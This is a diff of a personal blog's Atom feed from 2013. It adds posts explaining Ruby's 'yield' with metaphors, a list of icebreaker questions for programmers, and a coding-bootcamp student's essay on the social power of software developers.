+
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode4.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode6.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode7.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<br><br><br>
+
+
+<p>These are trivial examples because they could be re-written with no added key-strokes as:</p>
+
+<br><br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode8.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode9.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<br><br><br>
+
+
+<p>-AND-</p>
+
+<br><br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode10.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode11.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<br><br><br>
+
+
+<p>The interesting implementions of the &lsquo;yield&rsquo; keyword involve methods with more logic. For example:</p>
+
+<br><br><br>
+
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode12.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode13.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode14.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<p><img src="http://desmondrawls.github.io/images/yieldcode15.jpg" alt="code" height="300" width="1000" display="inline"></p>
+
+<br><br><br>
+
+
+<p>That&rsquo;s &lsquo;yield&rsquo; in action. &lsquo;yield&rsquo; allows you to, on the fly, add a bit of custom logic to your methods. It might feel like a slippery concept because it is. For people that learn from metaphors I came up with 5 that might help:</p>
+
+<h3>1. &lsquo;yield&rsquo; is the settings on your microwave. Like on mine i have &ldquo;time defrost&rdquo;, &ldquo;auto defrost&rdquo;, &ldquo;reheat&rdquo;, &ldquo;cook&rdquo;, &ldquo;popcorn&rdquo;, &ldquo;pizza&rdquo;, and &ldquo;beverage.&rdquo;</h3>
+
+<p><img src="http://desmondrawls.github.io/images/popcorn.jpg" alt="Smiley face" height="200" width="400" display="inline"></p>
+
+<h3>2. &lsquo;yield&rsquo; is the attachments on your kitchenaid food processor.</h3>
+
+<p><img src="http://desmondrawls.github.io/images/mixer.jpg" alt="Smiley face" height="400" width="400" display="inline"></p>
+
+<h3>3. &lsquo;yield&rsquo; is AutoTune.</h3>
+
+<p><audio src="http://desmondrawls.github.io/audio/chipmunk.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
+
+<p><audio src="http://desmondrawls.github.io/audio/vader.m4a" controls><a href="../audio/vader.m4v">an audio</a></audio></p>
+
+<h3>4. &lsquo;yield&rsquo; is tinted sunglasses.</h3>
+
+<p><img src="http://desmondrawls.github.io/images/bono.jpg" alt="Smiley face" height="200" width="400" display="inline"><img src="http://desmondrawls.github.io/images/bonoblue.jpg" alt="Smiley face" height="200" width="400" display="inline"></P>
+
+
+<h3>5. &lsquo;yield&rsquo; is that trick play from Little Giants.</h3>
+
+<p><video src="http://desmondrawls.github.io/images/little_giants.mp4" controls><a href="http://desmondrawls.github.io/images/little_giants.mp4">a film</a></video></p>
+
+<br><br><br><br><br><br><br><br>
+
+
+<p>I hope that helps&hellip;</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[20 Questions I need to Ask any programmer before I can guess what you're about]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/06/14/20-questions/"/>
+    <updated>2013-06-14T16:03:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/06/14/20-questions</id>
+    <content type="html"><![CDATA[<p>What software do you wish you had been the one to make?</p>
+
+<p>If you could time travel would you go to the future or the past?</p>
+
+<p>If you could create your own non-Marvel, non-DC superpower what would it be?</p>
+
+<p>Would you rather have the power of invisibilty or be able to fly?</p>
+
+<p>Would you plant a chip in your brain that made it so you never forgot your passwords?</p>
+
+<p>Would you plant a chip in your brain that made it so you never forgot a name?</p>
+
+<p>Would you plant a chip in your brain that made it so you never forgot anything ever?</p>
+
+<p>Would you plant a chip in your brain that made you a better programmer?</p>
+
+<p>If you were offered immortality would you take it?
+What if you had a +1?</p>
+
+<p>How many years do you think it would take before you got bored?</p>
+
+<p>How do you think people would behave if they were immortal?</p>
+
+<p>What physical thing does the world need more of?</p>
+
+<p>What cultural thing does the world need more of?</p>
+
+<p>What political thing does the world need more of?</p>
+
+<p>What does the programming world need more of?</p>
+
+<p>If you could create one of the above things which would it be?</p>
+
+<p>If the American Dream were a stock would you buy it?</p>
+
+<p>Which is better: owning a house or making your own hours?</p>
+
+<p>Which is better: owning a house or being your own boss?</p>
+
+<p>Which is better: being your own boss or working less?</p>
+
+<p>Which is worse: one innocent person dying or 100 innocent people suffering?</p>
+
+<p>Which is worse: one asshole dying or 100 innocent people suffering?</p>
+
+<p>Do you vote?</p>
+
+<p>Do you like to travel?</p>
+
+<p>Do you sing in the shower?</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Who's in Charge Here?]]></title>
+    <link href="http://desmondrawls.github.io/blog/2013/06/11/whos-in-charge-here/"/>
+    <updated>2013-06-11T19:36:00-04:00</updated>
+    <id>http://desmondrawls.github.io/blog/2013/06/11/whos-in-charge-here</id>
+    <content type="html"><![CDATA[<p><strong>Recording live from the mountain-top, fog-shrouded monastery of the holy order of uninitialized variables aka the chamber of binary incantations aka the cave of forgotten code aka the officer candidate school in the global war on minor inconveniences aka just another secret underground yoleo-enabled satellite surveillance station aka the equal-opportunity drop in a white male pond aka the how-many-computer-nerds-does-it-take-to-make-a-cup-of-coffee research labratory aka The learn-you-some-git-and-join-a-startup School aka The Flatiron School.</strong></p>
+
+<br/>
+
+
+<br/>
+
+
+<p>Here among the 1000 twisted power cords at Flatiron School we are blessed with many fascinating guest speakers. This is our opportunity to break the command line’s spell and focus on the big picture. I love the big picture. And I love new perspectives.  The web developer’s perspective is completely new for me.  The Flatiron School is really my first experience of life on the other side of the retinal display. That said, after only a week of fascinating guest speakers one thing has really hit me:</p>
+
+<br/><br/>
+
+
+<p><strong>Code is power. Power to shape the world.</strong></p>
+
+<p>And my question is:</p>
+
+<p><strong>What guides this power?</strong></p>
+
+<br/><br/>
+
+
+<p>When you write code for public consumption you are literally putting the stuff you think is important in someone else’s face. Right in their face. Being a wire-whisperer is comparable to being mega-rich &ndash; everybody has to listen to you.  Add to that that programmers are often mega-rich too and I’m starting to see a bigger picture. Programmers are first class citizens. And wherever you have first-class citizens you have a lot of second-class citizens.</p>
+
+<br/><br/><br/>
+
+
+<p>Let’s look at an example of that power:</p>
+
+<p>During his re-election campaign Obama raised 230 million dollars largely in donations of less than $200. He also has 32 million twitter followers (take that Ashton!). Did twitter get Obama elected? Something like that. In 2012 Obama’s dev team beat Romney’s dev team to every single punch. Obama was the first to get a “Square app for in-person fundraising” and the first to get a “‘Quick Donate’ feature that allowed donors who had already given once to send a repeat donation”. And it worked!
+(<a href="http://techpresident.com/news/23106/romneys-digital-campaign-second-place-finish" title="2012 digital campaign">2012 digital campaign</a>)<br/>
+In 2008, it was the same story. Obama’s online campaign gave McCain&rsquo;s campaign the rearview mirror treatment.
+(<a href="http://www.nationaljournal.com/magazine/online-fundraising-revolution-20080419" title="2008 digital campaign">digital campaign 2008</a>)
+This phenomenon is about more than Obama’s human resources team. It’s a reflection of where the silicone tower’s loyalties lie.
+(<a href="http://fivethirtyeight.blogs.nytimes.com/2012/11/28/in-silicon-valley-technology-talent-gap-threatens-g-o-p-campaigns/" title="tech politics">tech politics</a>)
+I don’t know if Obama won because of his online campaign but I’m sure it didn’t hurt. And the power behind that campaign was a small group of people with strong opinions. Shaping the world just like that.</p>
+
+<p>And don&rsquo;t get me started on <a href="http://desmondrawls.github.io/images/prison.jpg">PRISON</a>, I mean <a href="http://desmondrawls.github.io/images/prison.jpg">PRISM</a>.</p>
+
+<p>The world isn’t flat but it’s close: <a href="http://desmondrawls.github.io/images/macair.jpg">sorta flat</a></p>
+
+<br/>
+
+
+<br/>
+
+
+<br/>
+
+
+<p>I could imagine someone comparing the power of web sensations to the power of pop art. And who doesn’t love art? The difference I see is that art’s power is purely the power of persuasion and seduction. Meanwhile, programming has all that plus direct real world implications. What problems are you solving? Who are you marketing to? How does your product affect the people you aren’t marketing too? Are you hacking the Chinese government? In terms of content and reach, the media seems like a more appropriate comparison. Tech is like a media personality that sleeps under your bed, follows you around all day, spies on your neighbors, and talks to your friends on your behalf. So if the media is the 4th branch of government what does that make software? The 5th, 6th, 7th branch of government?</p>
+
+<br/>
+
+
+<br/>
+
+
+<p>I’m coming to the Flatiron School from a carpentry job. Programming appealed to me because it looked like a similar craft that happens to pay more and happens to take place in a safe, climate-controlled space and happens to be a bridge to a lot of interesting projects. But it’s the interesting projects that really separates code from other crafts. Coders have voices. Mechanics <em>don&rsquo;t</em> have voices. Carpenters <em>don&rsquo;t</em> have voices. Coders have voices and microphones and 5.1 surround sound speaker systems. That kind of platform should be approached cautiously and used carefully. I’m worried, however, that many coders use their voices the way bankers use their extra cash. I’m worried that there’s a lack of seriousness when it comes to the real world.</p>
+
+<br/>
+
+
+<br/><br/>
+
+
+<p>And that brings us back to the original question:</p>
+
+<h3>What do web developers care about?</h3>
+
+<p>What do white men(that&rsquo;s me) with google glasses(not me) think the world needs more of? I really want to know.</p>
+
+<br/><br/><br/>
+
+
+<p>I also want to know if there is as much time and energy going into discussing how to use Code as there is going into discussing how to write code. Because there should be.</p>
+
+<br/><br/><br/>
+
+
+<p>To be clear, I am not taking issue with anyone’s particular political or social ends. I am concerned with the structure of power. In this great land of checks and balances it seems like there might be another balance going unchecked.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[say my name git]]></title>
     <link href="http://desmondrawls.github.io/blog/2013/06/09/say-my-name-gitgit-push-origin-source/"/>
     <updated>2013-06-09T14:02:00-04:00</updated>
     <id>http://desmondrawls.github.io/blog/2013/06/09/say-my-name-gitgit-push-origin-source</id>
